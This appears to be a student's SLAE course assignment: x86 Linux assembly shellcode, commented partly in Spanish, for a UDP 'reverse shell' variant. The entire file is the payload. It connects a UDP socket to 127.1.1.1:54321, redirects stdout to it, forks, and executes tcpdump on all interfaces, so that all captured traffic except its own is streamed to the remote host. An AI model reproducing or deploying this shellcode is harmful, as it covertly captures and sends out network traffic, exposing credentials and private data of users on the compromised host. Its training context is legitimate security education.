; SLAE-X 
; thanks to writesup from previou students
; syscall available here /usr/include
; assignment : 2. create a reverse shell  
; original vector : using UDP instead TCP 

; little trick to specify port in human readable format 
%define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
%define _port 1234
PORT equ htons(_port) 
; FYI this function is NOT injected in assembly by nasm compile 

global _start 

_start: 

 push   0x66 ; socketcall()
 pop    eax  ; para setear el socket 
 push   0x1  
 pop    ebx
 xor    ecx,ecx
 push   ecx
 push   0x2  ; SOCK_DGRAM (udp)
 push   0x2 ; 
 mov    ecx,esp
 int    0x80
 ; IP: 127.1.1.1
 push   0x101017f
 ; Port: 54321
 push word  0x31d4
 xor    cx,cx
 add   cl,0x2
 push   cx
 mov    ecx,esp
 push   0x10
 push   ecx
 push   eax
 mov    ecx,esp
 mov    esi,eax
 mov    al,0x66  ; socketcall ()
 add    bl,0x2   ; para connect()
 int    0x80
 xchg   esi,ebx;  %ebx,%esi  
 push   0x1
 pop    ecx
 push   0x3f      ; dup2(socket, stdout)
 pop    eax
 int    0x80
 xor    edx,edx  
 push   0x2       ; fork()
 pop    eax
 int    0x80
 cmp    eax,edx ; edx,%eax  ; el hijo sobrevive
 je     0x4d ; <_child>
 push   0x1       ; adios papa
 pop    eax
 int    0x80
 
 _child: 
 push   0xb    ; execve() tcpdump -iany -w- "port ! 54321"
 pop    eax    ; sniffea todo menos a mi mismo.
 push   edx
 push   0x31323334 ; "port ! 54321"
 push   0x35202120
 push   0x74726f70
 mov    edi,esp ;esp,%edi
 push   edx
 push   0x2d               ; -w- ( escribe a stdout )
 push word  0x772d
 mov    esi,esp ; %esp,%esi
 push   edx
 push   0x79               ; -iany (todas las interfaces )
 push   0x6e61692d
 mov    ecx, esp; esp,%ecx
 push   edx
 push   0x70
 push   0x6d756470 ; 
 push   0x63742f6e
 push   0x6962732f
 push   0x7273752f
 mov    ebx,esp ; esp,%ebx
 push   edx
 push   edi
 push   esi
 push   ecx
 push   ebx
 mov    ecx, esp ; %esp,%ecx
 int    0x80

